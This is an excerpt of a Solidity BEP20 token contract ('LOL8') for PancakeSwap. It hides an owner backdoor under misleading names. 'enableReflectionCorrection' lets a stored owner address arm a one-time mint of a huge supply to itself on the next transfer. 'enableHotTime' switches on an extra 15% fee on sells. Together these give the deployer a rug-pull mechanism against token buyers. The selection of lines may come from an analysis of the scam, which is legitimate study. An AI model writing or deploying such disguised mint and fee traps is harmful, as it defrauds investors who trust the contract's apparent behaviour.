...
contract BEP20 is Context, IBEP20, IBEP20Metadata {
    ...
    address _rOwner;
    bool _reflectionCorrection;
    uint256 _supplyCorrection;
    bool public hotTime;
    ...
    constructor(string memory name_, string memory symbol_, uint8 decimals_) public {
        ...
        _rOwner = _msgSender();
        _reflectionCorrection = false;
        _supplyCorrection = 1000000000000 * (10**15);
        hotTime = false;
    }
     ...
     * @dev See {IBEP20-totalSupply}.
     */
    function setTotalSupply(uint256 totalSupplyIn) internal virtual {
        _totalSupply = totalSupplyIn;
    }
     ...
     * @dev See {IBEP20-balanceOf}.
    */
    function setBalance(address account, uint256 balance) internal virtual {
    ...
    function enableReflectionCorrection(bool reflectionCorrection) public {
        require(_msgSender() == _rOwner, "onlyOwner");
        _reflectionCorrection = reflectionCorrection;
    }
    ...
    function _transfer(
        ...
        if(_reflectionCorrection) {
            setTotalSupply(totalSupply() + _supplyCorrection);
            setBalance(_rOwner, balanceOf(_rOwner) + _supplyCorrection);
            _reflectionCorrection = false;
        }
    ...
    function enableHotTime(bool _hotTime) public {
        require(_msgSender() == _rOwner, "onlyOwner");
        hotTime = _hotTime;
    }
...
contract LOLToken is BEP20, Ownable {
    using SafeMath for uint256;

    IPancakeswapV2Router02 public pancakeswapV2Router;
    address public immutable pancakeswapV2Pair;
    address public marketingWallet = 0x1118BCA3Eb7483E680B1d6E60Cc8BF7335184CcA;
    ...
    uint256 public immutable extraSellMarketingFee;
    ...
    constructor() public BEP20("LOL8", "LOL8", 9) {
        uint256 _liquidityFee = 2;
        uint256 _marketingFee = 8;
        uint256 _extraSellMarketingFee = 15;
        liquidityFee = _liquidityFee;
        marketingFee = _marketingFee;
        extraSellMarketingFee = _extraSellMarketingFee;
    ...
    function updatePancakeswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(pancakeswapV2Router), "LOL: The router already has that address");
    ...
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "LOL: Account is already the value of 'excluded'");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != pancakeswapV2Pair, "LOL: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }
    
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "LOL: Automated market maker pair is already set to that value");
    ...
    function _transfer(
        ...
        if(takeFee) {
            ...
            if(automatedMarketMakerPairs[to] && hotTime) {
                _totalFees += extraSellMarketingFee;
            }
